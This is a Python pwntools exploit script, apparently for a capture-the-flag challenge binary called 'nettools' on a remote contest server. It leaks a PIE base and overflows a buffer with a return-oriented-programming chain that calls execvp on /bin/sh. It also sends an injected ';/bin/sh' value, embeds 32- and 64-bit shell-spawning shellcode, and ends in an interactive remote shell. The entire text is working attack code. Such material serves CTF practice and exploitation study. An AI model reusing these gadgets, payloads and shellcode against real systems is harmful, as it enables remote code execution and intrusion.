from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './nettools'
HOST = 'chals.sekai.team'
PORT =  4001

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	#script += "b core::slice::{impl#0}::split_at<u8>\n"
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))
_32_SHELLCODE = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
_64_SHELLCODE = b"\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

diff = 0
while True:
    r = start()
    if args.D:
	    debug(r, [0x540b3, 0x59dbf, 0x4cceb])

    r.recvuntil(b'leaked: ')
    leak = int(r.recvuntil(b'\n', True), 16)
    dbg('leak')
    pie = leak -0x7a03c
    dbg('pie')

    rax = pie + 0x000540b3
    syscall = pie + 0x00025adf
    rdx = pie + 0x00020bb3#: pop rdx; add [rax], al; ret;
    rdi = pie +0x0005f373
    rsi_p1 = pie + 0x0005f371
    binsh = pie + 0x60118
    ed = pie + 0x651fe#0x64a59
    #ed = pie + 0x64a59
    sid = pie + 0xf18
    got_read = pie + 0x798a8
    got_execvp = pie + 0x79dc8
    call_execvp = pie + 0x420a5
    rcx = pie + 0x0005f0d8
    rbp = pie + 0x0005d67d
    leave = pie + 0x0005f308
    gadget = pie + 0x00059dbf#: mov rdi, [rsp+0x10]; mov rax, [rsp+8]; call qword ptr [rax+0x18];
    deref = pie + 0x0004cceb#: mov rdi, [rdi+0x10]; mov rax, rdi; pop rcx; ret;
    ptr = pie + 0x7a058
    #pause()
    r.sendlineafter(b'> ', b'aa;/bin/sh\x00')
    r.sendlineafter(b'> ', b'3')
    payload = b'/bin/sh\x00' + b'\x00'*392+b'a'*344+flat(rdi, ptr-0x10, deref, 0, rsi_p1, 0, 0xbeef, call_execvp)
    #payload = b'/bin/sh\x00' + b'\x00'*392+b'a'*344+flat(rax, pie+0x7a000, rdx, 0, rdi, ptr, rsi_p1, 0, 0xbeef, call_execvp)
    if b'\n' in payload:
        r.close()
        continue
    #r.sendlineafter(b': ', b'\x00'*400+b'a'*344+flat(rax, pie+0x7a000, rdx, 0, rdi, sid, rsi_p1, 0, 0xbeef, call_execvp))
    r.sendlineafter(b': ', payload)
    #r.interactive()
    #break

    try:
        r.sendlineafter(b'name!\n', b'ls')
        break
    except:
        pass
    diff += 1
    r.close()

r.interactive()
